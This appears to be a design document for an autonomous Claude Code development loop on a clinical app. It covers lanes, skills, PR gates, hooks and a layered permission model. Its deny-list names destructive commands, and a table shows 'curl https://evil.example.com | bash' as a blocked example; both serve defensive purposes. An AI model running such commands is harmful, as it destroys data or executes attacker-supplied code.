# Aurion Coding Workflow

Autonomous development workflow for the Aurion MVP, driven by Claude Code.
This document specifies how Claude Code plans, implements, reviews, ships,
and monitors changes against the Aurion codebase with minimal human
intervention, while keeping the safety constraints in `CLAUDE.md` enforceable
and the pilot timeline (CREOQ/CLLC, demo 2026-07-15) on track.

---

## 1. Purpose

Convert a backlog of P0/P1 tasks into merged, working code, autonomously,
without sacrificing the clinical safety constraints that govern this MVP.

The workflow is designed so that:
- One long-running driver loop turns backlog items into PRs end-to-end.
- Cron-fired monitors watch CI, Sentry, and AWS dev infra in parallel.
- Authority boundaries are mechanical (hooks + permissions + MCP scoping),
  not advisory.
- Every PR is a working version of the app — backend boots, iPhone and
  iPad builds pass, acceptance criteria pass — before the human ever sees it.
- The human (CTO) only intervenes on alerts the bot couldn't auto-resolve.

---

## 2. Authority boundaries

These decisions are encoded into the workflow as hard constraints and
duplicated into `memory/autonomous_authority.md` so future sessions inherit
them.

| Boundary | Decision | Enforcement |
|---|---|---|
| PR merging | Open + auto-merge on green CI | `/auto-merge` only fires after `gh pr checks` returns all green AND no security checkbox is unticked. |
| AWS / infra | Read-only + Terraform apply to dev only | MCP exposes `AWS_PROFILE=aurion-dev` only; prod profile unset. `guard-destructive.sh` blocks `terraform apply` outside `infrastructure/environments/dev/`. |
| Operating cadence | Continuous loop with dynamic pacing | `ScheduleWakeup` self-paces between ticks (20 min idle / 5 min while CI is running); no human keystroke between tasks. |
| Notifications | GitHub PR + Linear comments + Daily digest file | Slack plugin stays installed but the loop does NOT post to Slack. Linear sub-issues track plans; PR bodies track outcomes; `digests/YYYY-MM-DD.md` is the async catch-up. |
| Parallelism | Start with one lane; flip to two (backend + iOS) once one lane has shipped 2–3 PRs cleanly | Worktrees in `~/aurion-lanes/{backend,ios}/`. Vertical slices that span both stay in a single lane. See §4. |
| Permissions | Allow-list pre-approval + deny-list hard block + destructive-guard hook | Three-layer model in §11. `default` permission mode, NOT `bypassPermissions`. |

---

## 3. Architecture

```
┌──────────────────────────────────────────────────────────────────┐
│  Driver loop (continuous /loop, dynamic pacing)                  │
│  → picks next task → plans with AC → implements → verifies       │
│  → /simplify → opens PR with security checklist                  │
│  → ScheduleWakeup polls CI → auto-merges on green                │
└──────────────────────────────────────────────────────────────────┘
        ↑                                              ↓
        │              ┌──────────────────────────────────────────┐
        │              │  Monitor cron (every 30 min, 06:00-22:00)│
        │              │  • CI status of open PRs                 │
        │              │  • Sentry new issues                     │
        │              │  • AWS dev CloudWatch alarms             │
        │              │  • Appends to .claude/state/alerts.md    │
        │              └──────────────────────────────────────────┘
        │                                              ↓
┌──────────────────────────────────────────────────────────────────┐
│  Daily digest cron (18:00 weekdays)                              │
│  → walks git log + audit log + Linear since cursor               │
│  → writes digests/YYYY-MM-DD.md                                  │
│  → posts ~200-word summary to Linear "Aurion Daily" project      │
└──────────────────────────────────────────────────────────────────┘
```

The driver owns implementation. The monitor is read-only and nudges the
driver only via a sentinel file (`alerts.md`) when something needs attention.
This split means a wedged driver doesn't blind your monitoring.

---

## 4. Parallel lanes via worktrees

Long-form parallelism via `git worktree` so non-overlapping backlog items
can ship simultaneously without branch-switching or build-artifact collision.

### Layout

```
~/Documents/GitHub/Aurion/              ← main checkout, always at origin/main
                                          State files (.claude/state/*) live here.
                                          Read-only for the loops; only humans push to main.

~/aurion-lanes/backend/                 ← worktree for the backend lane
                                          Branch: lane-backend/{task-id}
                                          Touches: backend/**, infrastructure/**

~/aurion-lanes/ios/                     ← worktree for the iOS lane
                                          Branch: lane-ios/{task-id}
                                          Touches: ios/**, demo/**
```

Create with:

```bash
git worktree add ~/aurion-lanes/backend -b lane-backend/init
git worktree add ~/aurion-lanes/ios     -b lane-ios/init
```

### Lane assignment

Backlog items carry a `lane:` tag:

```markdown
## Active
- [ ] P0-04 Alembic migrations — 8d — lane: backend
- [ ] P0-06 Persistent users + admin refactor — 8d — lane: backend
- [ ] B-08 Eval persistence — 3d — lane: backend
- [ ] P0-07 E2E smoke test — 3d — lane: backend
- [ ] Dashboard Stage 2 tile — 3d — lane: ios
```

`/next-task` filters by the running loop's lane. A vertical slice that
spans both — e.g. a new endpoint + iOS client — gets tagged with the lane
of the bigger change and stays sequential within that lane.

### Coordination

State files are the only thing that crosses lanes:

- `.claude/state/backlog.md` — read by both, written by both (one writes at a
  time; use `flock` in the skill that mutates it)
- `.claude/state/alerts.md` — append-only; lock-free is fine
- `.claude/state/in-flight.json` — JSON file each loop writes its current
  task id to. The other lane reads to avoid duplicate work; humans read to
  see what's running.

Both loops chdir to their worktree at the start of each tick and stay there
until the tick completes. The state files are referenced by absolute path
to the main checkout so neither lane fragments them.

### Disk considerations

Each worktree duplicates:
- `ios/Aurion/build/` (Xcode build artifacts, several GB on big iPads)
- `backend/venv/` if used (~200 MB)
- `__pycache__/`, `.terraform/`, etc.

We hit `ENOSPC` once during this session's iOS test runs. With two lanes
the headroom drops. Mitigations:
- Use a single shared Xcode DerivedData via `xcodebuild -derivedDataPath` if
  both lanes ever touch iOS (they shouldn't, by lane assignment).
- Add a weekly cron: `docker system prune -f && find ~/Library/Developer/Xcode/DerivedData -mtime +7 -delete`
- Both lanes share the same Docker daemon; `docker compose up` from one
  lane is visible to the other. Don't both run the stack at once — use the
  lane assignment to keep backend stack ownership clear (backend lane brings
  up + tears down; iOS lane only consumes).

### When NOT to parallelize

- Vertical slices (backend endpoint + iOS client + migration in one go).
  Cross-lane PRs are confusing and the working-version gate becomes ambiguous.
- The first 2–3 PRs after the workflow is built — run sequential while the
  loop's rough edges surface.
- Anything touching `CLAUDE.md`, `AURION-CODING-WORKFLOW.md`, or backlog
  structure. Workflow changes are sequential by definition.

---

## 5. Memory & state

State that must survive across sessions lives in version-controlled files.

### `.claude/state/backlog.md`

The canonical task list. The loop reads top-to-bottom and works the topmost
Active item matching its lane.

```markdown
## Active
- [ ] P0-04 Alembic migrations — 8d — lane: backend — no blockers
- [ ] P0-06 Persistent users + admin refactor — 8d — lane: backend — depends on P0-04
- [ ] B-08 Eval persistence — 3d — lane: backend — depends on P0-04
- [ ] P0-07 E2E smoke test — 3d — lane: backend — depends on P0-06, B-08
- [ ] Dashboard Stage 2 tile — 3d — lane: ios — no blockers

## In flight
(loops move the top Active item here when starting; logs PR # when opened)

## Blocked
(loops move items here after 3 failed fix attempts; appends reason)

## Done
(loops move here after auto-merge)
```

### `.claude/state/alerts.md`

Append-only file the monitor writes. Each tick begins by reading this file
and handling new alerts before picking the next task.

### `.claude/state/in-flight.json`

```json
{
  "backend": {"task_id": "P0-04", "branch": "lane-backend/p0-04-alembic", "pr": 42, "started_at": "2026-05-15T09:14:00Z"},
  "ios":     {"task_id": null}
}
```

Each lane updates its own key. Other lanes read for de-duplication; humans
read for visibility.

### `.claude/state/digest-cursor.txt`

Single line — last-processed audit-log timestamp. Used by the daily digest
to avoid double-reporting.

### `memory/autonomous_authority.md`

Auto-memory entry that captures the authority boundaries so future sessions
don't have to re-ask. Indexed in `memory/MEMORY.md`.

### `digests/`

One markdown file per weekday at 18:00, containing what was shipped, what
was blocked, what's next.

---

## 6. Skills

Invocable via the `Skill` tool. Each is a `.claude/skills/<name>/SKILL.md`
with frontmatter + instructions.

| Skill | Responsibility |
|---|---|
| `/next-task` | Read `backlog.md`, filter by current lane, pick top Active item, move to In flight, return descriptor. |
| `/plan-task` | Spawn the `Plan` subagent with the descriptor. Output MUST include acceptance criteria and security implications. Commit the plan as the first commit on the feature branch. |
| `/implement` | Run the plan; delegate to `@backend-builder` or `@ios-builder`; commit after each green test. |
| `/verify-acceptance` | Mandatory gate before `/open-pr`. See §8. |
| `/simplify` | Three parallel review agents (reuse, quality, efficiency). Auto-fix Priority-1 findings. |
| `/open-pr` | `gh pr create --body-file` using the structured PR template. See §9. |
| `/await-ci` | `ScheduleWakeup` 5 min, then poll `gh pr checks`. Green → `/auto-merge`. Red → `/diagnose-ci`. |
| `/diagnose-ci` | Pull failed-job logs via `gh run view`, identify the failure, fix, push, re-await. Max 3 retries before flagging. |
| `/auto-merge` | `gh pr merge --auto --squash --delete-branch`. Only fires if all security checkboxes are ticked. Move backlog item Active → Done. |
| `/daily-digest` | Walk audit log + git log + Linear since cursor; write `digests/YYYY-MM-DD.md`; post summary to Linear. |
| `/monitor-tick` | Read PR status + Sentry + AWS dev CloudWatch. Append to `alerts.md` only on state changes. |

Skills are the unit of orchestration. The driver `/loop` chains them; cron
fires monitor/digest skills directly.

---

## 7. Subagents

Workers spawned per job. Putting heavy work in subagents keeps the driver's
context window clean — each subagent gets a fresh window per task.

| Subagent | Spawned by | Job |
|---|---|---|
| `Plan` (built-in) | `/plan-task` | Architectural design + acceptance criteria. |
| `@backend-builder` | `/implement` (backend tasks) | FastAPI modules per CLAUDE.md patterns. |
| `@ios-builder` | `/implement` (iOS tasks) | SwiftUI; runs xcodebuild for verification. |
| `@test-writer` | After every builder run | Writes pytest / Swift Testing cases that verify each AC. |
| `@compliance-checker` | After every module touch | Scans for PHI in logs/errors/responses; descriptive-mode violations. |
| `@schema-validator` | When touching JSON schemas or Pydantic models | Verifies template + AppConfig schemas. |
| `@provider-evaluator` | Manual only | Phase 2 model comparison; not in pilot path. |

Each subagent is defined in `.claude/agents/<name>.md`.

---

## 8. Acceptance criteria + the verification gate

### Plan template

`/plan-task` produces a plan with this exact structure. If acceptance criteria
are missing, the loop refuses to advance and posts to `alerts.md`.

```markdown
## Task
{task-id} — {one-line description}

## Why
{Business/pilot driver in 1-2 sentences. Quote the CLAUDE.md section
or backlog ID this satisfies.}

## Approach
{Architectural sketch. Files to touch. Subagent assignments.}

## Acceptance criteria
Each criterion must be objectively verifiable — pass/fail, not "looks good".
- [ ] AC-1: {specific behavior}, verified by {pytest test name | curl command}
- [ ] AC-2: ...
- [ ] AC-3: ...

## Out of scope
{What this PR explicitly does NOT do. Forces deferral decisions upfront.}

## Test plan (executable)
1. `cd backend && python3 -m pytest tests/unit/test_xxx.py -v`
2. `curl -s localhost:8080/api/v1/...` should return ...
3. `xcodebuild -scheme Aurion -destination 'platform=iOS Simulator,name=iPhone 17' build`
4. ...

## Security implications
{Touches PHI? Audit log? Secrets? AI prompts? Consent gate? If none, say so.}
```

The plan is committed as `docs: plan for {task-id}` — the first commit on
the feature branch. Reviewers see what was committed to before any code.

### The verification gate

`/verify-acceptance` runs between `/implement` and `/open-pr`. It walks the
AC checklist and proves each one. The loop **cannot reach `/open-pr`** until
all five sub-checks pass:

1. **Backend builds + tests pass** — `docker compose build aurion-api && cd backend && python3 -m pytest -q`
2. **iOS builds for both targets** — `xcodebuild` succeeds on iPhone 17 **and** iPad Pro 11" (M4)
3. **Stack boots** — `docker compose up -d && curl -fs localhost:8080/health` returns 200 within 10 s
4. **Every AC verified** — each command from the plan runs and returns the expected result
5. **`/simplify` produces no Priority-1 findings** — three review agents in parallel; P1 findings are auto-fixed before continuing

Step 3 is the "working version of the app" enforcement. Step 4 is the
acceptance-criteria enforcement. Failures loop back to `/implement` with the
failure output as context. Max 3 fix attempts before flagging to `alerts.md`
and skipping to the next task.

---

## 9. Pull request template

`.claude/skills/open-pr/templates/pr-body.md`. The driver fills placeholders
from the plan, the diff, and the test output.

```markdown
## Summary
{1-2 sentences. What this PR delivers, who benefits, no jargon.}

## What changed
- **Backend**: {bullets by module — e.g. "new `POST /notes/{id}/x`, refactored `service.foo`"}
- **iOS**: {bullets by view/manager}
- **Schema/Infra**: {migrations added, Terraform changes, AppConfig keys}
- **Tests**: {N new unit tests, M new integration tests}

## Why
{The Aurion-specific reason. Backlog ID + CLAUDE.md section. Quote the
constraint or success-criteria line this PR satisfies.}

## Test plan
- [ ] `cd backend && python3 -m pytest -q` → {N passed}
- [ ] `xcodebuild ... iPhone 17 build` → BUILD SUCCEEDED
- [ ] `xcodebuild ... iPad Pro 11-inch (M4) build` → BUILD SUCCEEDED
- [ ] `docker compose up && curl localhost:8080/health` → 200
- [ ] {Each acceptance criterion from the plan, with the exact command and observed result}

## Security checklist
- [ ] **Descriptive mode**: every new AI prompt enforces "describe, don't interpret/diagnose" (CLAUDE.md §"Single Most Important Constraint")
- [ ] **No PHI in logs/errors/responses**: grep'd new logging + exception messages
- [ ] **AI calls via provider registry**: no direct `openai.ChatCompletion` / `anthropic.Anthropic` / `gemini.GenerativeModel` constructions
- [ ] **Masking proof preserved**: any new frame-upload path requires `MaskingProof` (P0-02)
- [ ] **Audit log append-only**: no new write paths can update/delete audit rows
- [ ] **Secrets via Secrets Manager**: no API keys in env vars at runtime, no keys in iOS bundle
- [ ] **Consent gate intact**: any new recording path checks `session.state == RECORDING` and `consent_confirmed` is in audit
- [ ] **iOS Keychain only for voice embedding**: no biometric data crosses the wire
- [ ] **Stage 1 < 30s / Stage 2 < 5min SLA**: any new sync work in the hot path measured and within budget
- [ ] **Fail-closed masking (P0-01)**: any new image upload path rejects on masking failure, never falls back to raw bytes

## Out of scope
{What this PR explicitly does NOT do — taken verbatim from the plan.}

## Deferred concerns
{Anything /simplify surfaced as Priority 2/3 that was conscious-not-fixed-here. Link to follow-up tickets if any.}

## Backlog
- Closes Linear AUR-{ticket}
- Backlog item: {P0-04 / M-09 / etc.}

🤖 Opened by Aurion autonomous loop · Plan commit: {sha}
```

Security checkboxes are not decorative — `/verify-acceptance` runs greps
against the diff and ticks the boxes it can prove. Boxes it cannot
auto-prove get left unticked. `/auto-merge` is **blocked** for any PR with
unticked security checkboxes until you tick them manually. Belt and
suspenders on top of the CI gate.

---

## 10. Hooks

`.claude/settings.json` (team-shared, NOT settings.local.json):

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Write|Edit",
        "hooks": [
          {"type": "command", "command": ".claude/hooks/phi-scan.sh ${file_path}", "blocking": true},
          {"type": "command", "command": ".claude/hooks/auto-lint.sh ${file_path}", "blocking": false}
        ]
      },
      {
        "matcher": "Edit|Write",
        "matcher_paths": ["backend/app/**/*.py"],
        "hooks": [{"type": "command", "command": ".claude/hooks/unit-tests-on-write.sh ${file_path}", "blocking": false}]
      }
    ],
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [{"type": "command", "command": ".claude/hooks/guard-destructive.sh", "blocking": true}]
      }
    ]
  }
}
```

| Hook | Behavior |
|---|---|
| `phi-scan.sh` | Greps the changed file for known PHI patterns in logging, exception messages, API responses. Blocks the write if found. |
| `auto-lint.sh` | Runs `ruff check --fix` for Python, `swift-format` for Swift. Non-blocking. |
| `unit-tests-on-write.sh` | Runs the matching test file if one exists. Non-blocking so the driver sees the failure without deadlock. |
| `guard-destructive.sh` | Blocks `rm -rf`, `git push --force`, `terraform apply` against prod paths, `aws ... delete-*` against prod accounts. |

Hooks are how authority gets enforced mechanically — even if a future
session forgets the rules, the hook script blocks the action.

---

## 11. Permission model

The autonomous loop cannot run with prompts on every Bash call — it would
block on consent. But "auto-approve everything" is the wrong knob. The
permission model is three layers, deepest first.

### Layer 1 — Permission mode

Run the loop in `default` permission mode, **NOT** `bypassPermissions` or
`acceptEdits`. Approval is granted by the allow-list (Layer 2), not by
relaxing the mode globally. Unknown commands still prompt → which for an
unattended loop means "pause this lane until human checks in", the correct
fallback.

### Layer 2 — Allow-list (`.claude/settings.local.json`)

Pre-approved patterns. The loop runs at full speed on these without prompting.

```json
{
  "permissions": {
    "allow": [
      "Bash(cd backend && python3 -m pytest:*)",
      "Bash(cd backend && python3 -m alembic:*)",
      "Bash(cd ios/Aurion && xcodebuild:*)",
      "Bash(xcodebuild -project Aurion.xcodeproj:*)",
      "Bash(docker compose build:*)",
      "Bash(docker compose up -d:*)",
      "Bash(docker compose down)",
      "Bash(docker compose ps)",
      "Bash(docker compose logs:*)",
      "Bash(curl -fs localhost:8080/*)",
      "Bash(curl -fs localhost:4566/*)",
      "Bash(awslocal --endpoint-url=http://localhost:4566:*)",
      "Bash(gh pr create:*)",
      "Bash(gh pr view:*)",
      "Bash(gh pr checks:*)",
      "Bash(gh pr merge:*)",
      "Bash(gh run view:*)",
      "Bash(gh run watch:*)",
      "Bash(gh issue:*)",
      "Bash(git add:*)",
      "Bash(git commit -m:*)",
      "Bash(git checkout -b lane-backend/:*)",
      "Bash(git checkout -b lane-ios/:*)",
      "Bash(git push origin lane-backend/:*)",
      "Bash(git push origin lane-ios/:*)",
      "Bash(git worktree:*)",
      "Bash(git status)",
      "Bash(git log:*)",
      "Bash(git diff:*)",
      "Bash(terraform plan:*)",
      "Bash(terraform validate)",
      "Bash(terraform fmt -check)",
      "Bash(grep:*)",
      "Bash(find . -name:*)",
      "Bash(ls:*)",
      "Edit", "Write", "Read"
    ]
  }
}
```

Anything not in this list prompts. Add patterns as the loop earns trust;
don't pre-approve speculatively.

### Layer 3 — Deny-list (overrides allow)

Hard blocks. Even if a future allow-list entry would match, the deny-list
wins.

```json
{
  "permissions": {
    "deny": [
      "Bash(rm -rf:*)",
      "Bash(git push --force:*)",
      "Bash(git push origin main:*)",
      "Bash(git push origin master:*)",
      "Bash(terraform apply -var-file=environments/prod*)",
      "Bash(terraform apply -var-file=environments/staging*)",
      "Bash(terraform destroy:*)",
      "Bash(aws s3 rm:*)",
      "Bash(aws s3api delete-:*)",
      "Bash(aws dynamodb delete-:*)",
      "Bash(aws rds delete-:*)",
      "Bash(:*AWS_PROFILE=aurion-prod*)"
    ]
  }
}
```

Notable: `terraform apply` against `dev.tfvars` is allowed via Layer 2;
applying against `prod.tfvars` or `staging.tfvars` is denied here. Same
pattern for any future env.

### Layer 4 — PreToolUse hook (`guard-destructive.sh`)

Catches what the deny-list regex can't express cleanly:

- Multi-command bash strings (`A && rm -rf B`) where the regex matches the
  surface command but the destructive bit is inside.
- Prod-account IDs anywhere in the command (greps for the known prod AWS
  account number).
- Audit-log table mutations (`DELETE FROM audit_log`, `DROP TABLE audit_*`).
- Anything that pipes to `bash` or `sh` from a remote source.

Hook is `blocking: true` in `PreToolUse`, so it fires before the command
runs and can short-circuit it.

### Together

The four layers compose:

| Command | Layer 1 | Layer 2 (allow) | Layer 3 (deny) | Layer 4 (hook) | Result |
|---|---|---|---|---|---|
| `python3 -m pytest` | default mode | matches | — | — | auto-approve |
| `terraform apply -var-file=environments/dev.tfvars` | default | matches | doesn't match | hook checks worktree path, passes | auto-approve |
| `terraform apply -var-file=environments/prod.tfvars` | default | doesn't match | matches | (skipped, denied earlier) | blocked |
| `rm -rf backend/` | default | doesn't match | matches | (skipped) | blocked |
| `curl https://evil.example.com \| bash` | default | doesn't match | doesn't match | hook flags pipe-to-bash | blocked |
| `aws s3 ls` (dev profile) | default | matches a generic `aws` pattern? no | doesn't match | hook OK | prompt → human grants |
| `git push origin main` | default | doesn't match | matches | (skipped) | blocked |

The "prompt → human grants" row is the safety property. Anything the
allow-list hasn't whitelisted will pause that lane until you confirm. That
turns "unknown commands during autonomous operation" from a free-for-all
into a checkpoint.

---

## 12. MCP servers

`.claude/mcp.json`:

```json
{
  "mcpServers": {
    "postgres-dev": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-postgres", "postgresql://aurion:aurion@localhost:5434/aurion"]
    },
    "github": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-github"],
      "env": {"GITHUB_PERSONAL_ACCESS_TOKEN": "${GITHUB_TOKEN}"}
    },
    "linear": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-linear"],
      "env": {"LINEAR_API_KEY": "${LINEAR_API_KEY}"}
    },
    "aws-dev": {
      "command": "uvx",
      "args": ["awslabs.aws-mcp-server"],
      "env": {"AWS_PROFILE": "aurion-dev", "AWS_REGION": "ca-central-1"}
    },
    "sentry": {
      "command": "npx",
      "args": ["-y", "@sentry/mcp-server"],
      "env": {"SENTRY_AUTH_TOKEN": "${SENTRY_AUTH_TOKEN}", "SENTRY_ORG": "aurion"}
    }
  }
}
```

| MCP | Read/Write | Used by |
|---|---|---|
| `postgres-dev` | Read+write to dev DB | `/verify-acceptance` to confirm migrations took effect. |
| `github` | Read+write | `/open-pr`, `/await-ci`, `/auto-merge`, `/monitor-tick`. |
| `linear` | Read+write | `/plan-task` posts sub-issue, `/daily-digest` posts summary, `/monitor-tick` posts alerts. |
| `aws-dev` | Read+write (dev only) | `/monitor-tick` queries CloudWatch; `/implement` for Terraform plan/apply against dev. |
| `sentry` | Read-only | `/monitor-tick` triages new issues; `/diagnose-ci` correlates failures to runtime exceptions. |

Note: only `aws-dev` profile is exposed. Prod credentials never get an MCP.
The "dev only" Terraform constraint is mechanical — the bot cannot reach
prod even if it tried.

---

## 13. Cron + the driver loop

### Crons

```cron
# Monitor — every 30 min, 06:00-22:00 weekdays
*/30 6-22 * * 1-5  claude /monitor-tick

# Daily digest — 18:00 weekdays
0 18 * * 1-5       claude /daily-digest

# Disk hygiene — Sunday 02:00
0 2 * * 0          docker system prune -f && find ~/Library/Developer/Xcode/DerivedData -mtime +7 -delete
```

### Driver loop start

For single-lane (start here):

```bash
cd ~/Documents/GitHub/Aurion
claude /loop "drive the Aurion MVP backlog autonomously per .claude/state/backlog.md.
Lane: backend.
Authority boundaries in memory/autonomous_authority.md.
Tick = one task end-to-end (plan → implement → verify → simplify → PR → CI → auto-merge → pick next).
Between ticks, ScheduleWakeup self-paces (20 min idle / 5 min while CI is running)."
```

For two-lane (after one lane has shipped 2–3 PRs cleanly):

```bash
# Terminal 1
cd ~/aurion-lanes/backend
claude /loop "drive backend lane per ~/Documents/GitHub/Aurion/.claude/state/backlog.md.
Lane: backend. ..."

# Terminal 2
cd ~/aurion-lanes/ios
claude /loop "drive iOS lane per ~/Documents/GitHub/Aurion/.claude/state/backlog.md.
Lane: ios. ..."
```

You start the loop once per lane. They self-pace and continue across
days/weeks until the lane's portion of the backlog is empty.

---

## 14. Task lifecycle (one tick)

```
 1. Read .claude/state/alerts.md
    → if anything new, handle FIRST before any new task work

 2. /next-task (lane-filtered)
    → pop top Active item for this lane, move to In flight
    → write .claude/state/in-flight.json

 3. /plan-task (Plan subagent)
    → produces plan with mandatory AC + security implications
    → MUST include "Test plan (executable)" with concrete commands

 4. Create feature branch: lane-{backend|ios}/{task-id}-{slug}
    → commit the plan doc as docs: plan for {task-id}

 5. Post plan to Linear sub-issue under the parent AUR-* ticket

 6. /implement
    → delegate to @backend-builder or @ios-builder
    → commit after each green test

 7. @test-writer
    → adds tests that verify each AC

 8. @compliance-checker
    → scans for PHI / descriptive-mode violations

 9. /verify-acceptance ← MANDATORY GATE
    9a. backend tests green
    9b. iPhone 17 build green
    9c. iPad Pro 11" build green
    9d. docker compose up + /health 200
    9e. each AC verified
    9f. /simplify produces no P1 findings
    fail? → loop back to step 6 with failure context, max 3 attempts

10. /open-pr
    → fills PR template, ticks security checkboxes it can prove

11. /await-ci
    → ScheduleWakeup 5 min, then poll gh pr checks
    → if all green AND all security checkboxes ticked → step 12
    → if red → /diagnose-ci

12. /auto-merge
    → gh pr merge --auto --squash --delete-branch
    → move backlog item Active → Done
    → clear in-flight.json for this lane

13. /next-task → step 1
```

---

## 15. Failure modes

| Failure | What the loop does |
|---|---|
| Plan missing AC | Re-invoke Plan subagent with explicit feedback. Max 2 retries → alert. |
| AC verification fails | Loop back to `/implement` with AC + failure output. Max 3 retries → alert + skip. |
| iOS builds on iPhone but not iPad | Treated as AC fail (universal-app rule). Back to implement. |
| Stack boots but `/health` fails | Treated as AC fail. Back to implement. |
| `/simplify` returns P1 finding | Auto-applied if cleanly fixable; otherwise back to implement. |
| Security checkbox can't be auto-proved | PR body says "needs human verification: {checkbox}". Auto-merge **blocked** until you tick. |
| CI red after 3 fix attempts | Append to `alerts.md`, move task to Blocked, pick next. |
| Three consecutive tasks blocked | Loop pauses, posts a global alert, waits for human intervention. |
| MCP server unavailable | Skill that needs it fails fast; alert appended; loop continues with degraded mode. |
| Unknown command (not in allow-list) | Loop pauses pending human consent; lane state remains coherent. |
| Both lanes try to mutate `backlog.md` | `flock` in the skill that mutates serializes them; second lane waits. |

The triple-block pause is the global safety net — if anything systematic is
broken, the loop stops digging the hole.

---

## 16. Setup order

Bottom-up, roughly one day of work.

1. **Backlog file + authority memory** (15 min) — give the loop something
   to read and a rulebook.
2. **Permission allow-list + deny-list** (30 min) — populate
   `settings.local.json` per §11. Test by running a few approved Bash
   commands manually to confirm they don't prompt.
3. **`/next-task` and `/open-pr` skills** (1 h) — minimal end-to-end
   without CI watching yet.
4. **GitHub + Linear MCP** (30 min) — needed before PR/Linear writes.
5. **`/plan-task` + `/verify-acceptance` skills** (2 h) — the quality
   gates. Promoted forward because nothing downstream is safe without them.
6. **Hooks** (1 h) — `phi-scan.sh` and `guard-destructive.sh` are
   safety-critical; lint + tests after.
7. **Manual loop test** — run `claude /loop` interactively on one P0 task
   in the main checkout (no worktree yet). Catch the rough edges.
8. **`/await-ci` + `/auto-merge`** (1 h) — close the autonomous loop.
9. **First single-lane autonomous run** — P0-04 Alembic migrations is a
   good candidate (backend-only, well-scoped, clear AC). Let the loop
   ship it end-to-end. Review the PR before auto-merge fires.
10. **Worktrees + lane-tagging** (30 min) — only after step 9 succeeds.
    Create the two worktrees per §4, tag the remaining backlog with
    `lane:` markers.
11. **Monitor cron + alerts.md** (30 min) — the safety net.
12. **Daily digest** (30 min) — quality-of-life on top.
13. **Two-lane operation** — only after a single lane has shipped 2–3 PRs
    cleanly and the monitor cron has caught at least one real alert.

Steps 9 and 13 are the trust gates. Don't skip them.

---

## 17. Operating notes

### When you sit down in the morning
- Read `digests/YYYY-MM-DD.md` (latest) for yesterday's summary.
- Check `.claude/state/alerts.md` for anything the bot couldn't handle.
- Check `.claude/state/in-flight.json` to see what each lane is working on.
- Scan the GitHub PR list — anything with unticked security checkboxes
  needs human review.
- If everything's green, the loop has nothing new for you. That's the
  intent.

### When you want to redirect the loop
- Edit `.claude/state/backlog.md` — re-order, add, remove items. The loop
  re-reads on the next `/next-task`.
- Change a `lane:` tag to move work between lanes. Don't do this while a
  task is In flight on that lane.
- If you need to pause, kill the loop process. State is in files; restart
  picks up where it left off.

### When the bot is stuck on a hard task
- The third-attempt alert posts to Linear with the failure traces, the
  plan, the partial diff. Read it, decide whether to:
  - Unblock via a code hint in the Linear comment (loop reads on next tick),
  - Take over manually (push to the feature branch yourself, the loop will
    detect and resume PR flow), or
  - Move the task to Blocked permanently with a reason.

### When a permission prompt fires
- A lane has hit an unknown command. The lane is paused, NOT blocked
  globally — the other lane keeps running.
- Open the prompting terminal, read the command, decide:
  - Genuinely-safe command → approve once + add a pattern to the allow-list
    so future runs auto-approve.
  - Suspicious command → deny + investigate.
- This is the system working as designed; treat allow-list growth as
  earned trust, not a chore.

### Cost control
- Each tick uses model time for plan + implement + verify + simplify.
- `/simplify` is the most expensive (three parallel agents); skip it on
  S-complexity tasks via the plan's "out of scope" line.
- The 30-min monitor cron is cheap — it's read-only and short.
- The daily digest is one moderate-context call per weekday.
- Two-lane operation roughly doubles model cost but halves calendar time.
  Worth it for a 9-week pilot push; not worth it for steady-state.

### Disk control
- Sunday 02:00 cron prunes Docker + stale DerivedData.
- If `df -h /` drops under 5 GB free, both lanes auto-pause via the
  destructive-guard hook (which refuses to start commands when free disk
  is under threshold). Add a manual cleanup; restart lanes.
- Don't run `docker compose up` in both lanes simultaneously — the
  backend lane owns the stack lifecycle.

### Pilot-specific guardrails
- Anything that touches `app/api/v1/screen.py`, `app/api/v1/frames.py`,
  `MaskingPipeline.swift`, or audit-log writers gets an automatic
  human-merge requirement even with green CI (via security-checkbox
  enforcement).
- Stage 1 < 30s and Stage 2 < 5min SLAs are checked by
  `/verify-acceptance` against `pilot_metrics` when touched.
- Descriptive-mode enforcement is non-negotiable. `@compliance-checker`
  blocks PR creation if any new prompt contains interpretive/diagnostic
  language.

---

## 18. What this workflow does NOT do

Honest list of limitations so expectations stay calibrated.

- **Does not own product decisions.** Backlog ordering is human-authored.
  The loop executes the order it's given.
- **Does not touch prod infra.** Ever. By design.
- **Does not handle clinical validation.** PHI compliance is mechanically
  enforced (descriptive mode, masking, audit log) but real clinical
  validation studies are out of scope.
- **Does not replace code review for novel architecture.** If a plan
  introduces a new module, the bot opens the PR; you should still read it
  before the auto-merge timer fires. Tick the security checkboxes only
  after you've read the diff.
- **Does not catch every bug.** It catches what tests, simplify, and
  acceptance criteria catch. Acceptance criteria are only as good as the
  plan; budget time for sharper plans on hard tasks.
- **Does not survive a wedged Claude Code process.** If a driver crashes,
  the monitor cron is still firing but no new tasks land. Restart the
  driver; state is preserved in `.claude/state/`.
- **Does not parallelize vertical slices.** Backend + iOS slices that must
  ship together (like M-08..M-10 from this codebase's history) stay
  sequential in one lane.
- **Does not auto-approve unknown commands.** Permission auto-mode is NOT
  set; new patterns are added to the allow-list explicitly as the loop
  earns trust.

---

## 19. References

- `CLAUDE.md` — the constraints this workflow enforces.
- `aurion-mvp-scope-backlog.md` — the source of backlog items.
- `MVP_Effort_Estimation_Aurion.xlsx` — current effort rollup and target
  demo date.
- `memory/MEMORY.md` + `memory/autonomous_authority.md` — durable
  cross-session state.

---

Last reviewed: 2026-05-14. Update this document when the workflow changes,
not the other way around.
